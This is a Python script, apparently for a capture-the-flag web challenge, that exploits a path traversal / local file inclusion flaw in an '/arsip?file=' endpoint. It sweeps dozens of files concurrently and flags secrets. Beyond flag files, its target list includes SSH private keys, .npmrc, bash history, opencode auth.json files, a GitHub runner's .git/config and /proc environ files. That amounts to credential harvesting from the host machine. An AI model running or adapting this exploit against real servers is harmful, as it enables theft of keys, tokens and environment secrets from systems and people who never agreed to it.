#!/usr/bin/env python3
"""LFI hunt: sweep candidate paths, flag anything that looks like a flag/secret."""
import concurrent.futures as cf
import html
import re
import urllib.parse
import urllib.request

BASE = "https://naples-division-mary-compounds.trycloudflare.com"
PATS = [
    ("flag", re.compile(r"(?i)(ctf\{|flag\{|FLAG\s*[:=]|bender\{| pico" + r"ctf)")),
    ("secret", re.compile(r"(?i)(secret|passwd|password|token|api[_-]?key|ghp_|ghs_|-----BEGIN)")),
]

CANDS = [
    # challenge dir
    "/home/runner/ctf-web/private/flag.txt", "/home/runner/ctf-web/private/rahasia.txt",
    "/home/runner/ctf-web/private/notes.txt", "/home/runner/ctf-web/private/flag2.txt",
    "/home/runner/ctf-web/private/admin.txt", "/home/runner/ctf-web/private/.env",
    "/home/runner/ctf-web/.env", "/home/runner/ctf-web/flag.txt", "/home/runner/ctf-web/flag",
    "/home/runner/ctf-web/notes.txt", "/home/runner/ctf-web/secret.txt", "/home/runner/ctf-web/.env.local",
    "/home/runner/ctf-web/config.json", "/home/runner/ctf-web/deploy.sh", "/home/runner/ctf-web/run.sh",
    "/home/runner/ctf-web/start.sh", "/home/runner/ctf-web/.github/workflows", "/home/runner/ctf-web/tunnel.log",
    "/home/runner/ctf-web/docker-compose.yml", "/home/runner/ctf-web/package.json",
    "/home/runner/ctf-web/node_modules/.package-lock.json", "/home/runner/ctf-web/.dockerignore",
    "/home/runner/ctf-web/arsip/laporan-q3.txt", "/home/runner/ctf-web/arsip/flag.txt",
    # home dir
    "/home/runner/flag.txt", "/home/runner/flag", "/home/runner/.flag", "/home/runner/notes.txt",
    "/home/runner/.ssh/id_rsa", "/home/runner/.ssh/authorized_keys", "/home/runner/.npmrc",
    "/home/runner/.bashrc", "/home/runner/.bash_history", "/home/runner/.gitconfig",
    "/home/runner/.opencode/opencode.json", "/home/runner/.opencode/auth.json",
    "/home/runner/.opencode/config.json", "/home/runner/.opencode/log/opencode.log",
    "/home/runner/.local/share/opencode/auth.json", "/home/runner/.config/opencode/opencode.json",
    "/home/runner/work/opencode-cloud/opencode-cloud/.git/config",
    "/home/runner/work/opencode-cloud/opencode-cloud/README.md",
    # system
    "/etc/hostname", "/etc/hosts", "/etc/os-release", "/etc/issue", "/etc/environment",
    "/flag.txt", "/flag", "/opt/flag.txt", "/root/flag.txt", "/tmp/flag.txt", "/tmp/flag",
    "/var/log/syslog", "/proc/self/cgroup", "/proc/self/mountinfo", "/proc/self/root/flag.txt",
    "/proc/6594/cmdline", "/proc/6594/environ", "/proc/1/environ",
]


UP = "../../../../"  # /home/runner/ctf-web/arsip -> /


def rel(p):
    """path.join() appends (not replaces) absolute paths, so rewrite to ../ form."""
    return UP + p.lstrip("/") if p.startswith("/") else p


def fetch(p):
    p = rel(p)
    url = BASE + "/arsip?file=" + urllib.parse.quote(p, safe="")
    r = urllib.request.Request(url)
    r.add_header("User-Agent", "ctf")
    try:
        resp = urllib.request.urlopen(r, timeout=25)
        code, raw = resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, p, ""
    except Exception as e:
        return None, p, f"ERR {e}"
    pre = re.findall(r"(?s)<pre[^>]*>(.*?)</pre>", raw)
    return code, p, html.unescape(pre[0]) if pre else ""


with cf.ThreadPoolExecutor(max_workers=8) as ex:
    results = list(ex.map(fetch, CANDS))

for code, p, body in results:
    if not body:
        continue
    hits = sorted({name for name, pat in PATS if pat.search(body)})
    head = re.sub(r"\s+", " ", body).strip()
    mark = " ".join(hits) or "-"
    print(f"[HIT {mark:14s}] {p}  ({len(body)}B)\n    {head[:240]}\n")

print("---- readable but no match ----")
for code, p, body in results:
    if code == 200 and body:
        pass
    elif code == 200:
        print(f"[200 empty] {p}")
missing = [p for c, p, b in results if c == 404]
print(f"\n{len(missing)} paths 404; {len([1 for c, p, b in results if c == 200 and b])} readable")
